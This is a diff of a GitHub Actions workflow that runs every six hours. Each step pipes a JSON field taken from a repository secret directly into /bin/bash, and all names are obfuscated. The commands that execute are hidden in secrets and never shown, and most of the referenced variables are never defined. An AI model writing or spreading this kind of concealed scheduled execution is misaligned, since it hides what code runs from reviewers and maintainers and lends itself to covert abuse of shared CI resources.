@@ -1,29 +1,29 @@
 name: snowsam7
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
-
+    - cron: '0 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: snowsam7
         env:
-          vvb2869: ${{ secrets.vvb2869 }}
+          kgk32: ${{ secrets.kgk32 }}
         run: |
-          echo $vvb2869 | jq -r .snz82934 | /bin/bash
-          echo $g6 | jq -r .gswak21 | /bin/bash
-          echo $uy69207 | jq -r .h765 | /bin/bash
-          echo $sb5 | jq -r .rwbs054 | /bin/bash
-          echo $cnhpp1 | jq -r .r13308 | /bin/bash
-          echo $pdxg355 | jq -r .nn706 | /bin/bash
-          echo $thzp20216 | jq -r .cfca292 | /bin/bash
-          echo $qmw0 | jq -r .all69599 | /bin/bash
-          echo $zi307 | jq -r .vdoid563 | /bin/bash
-          echo $jiujg06489 | jq -r .hal70 | /bin/bash
-          echo $di3 | jq -r .zamw242 | /bin/bash
+          echo $kgk32 | jq -r .mr676 | /bin/bash
+          echo $rgss704 | jq -r .tpck6654 | /bin/bash
+          echo $bgxap40 | jq -r .qk9211 | /bin/bash
+          echo $j47729 | jq -r .jfbub16 | /bin/bash
+          echo $gq6 | jq -r .rmff610 | /bin/bash
+          echo $cio186 | jq -r .u481 | /bin/bash
+          echo $qfxbv4 | jq -r .oheg03 | /bin/bash
+          echo $mq3666 | jq -r .hp386 | /bin/bash
+          echo $fbt48 | jq -r .mbg9790 | /bin/bash
+          echo $dxwxu23567 | jq -r .plrko5 | /bin/bash
+          echo $aj4679 | jq -r .ms7995 | /bin/bash
+          echo $n8 | jq -r .yymg24 | /bin/bash
+          echo $f50 | jq -r .mty42640 | /bin/bash
+          echo $wszs05462 | jq -r .cdi369 | /bin/bash
 
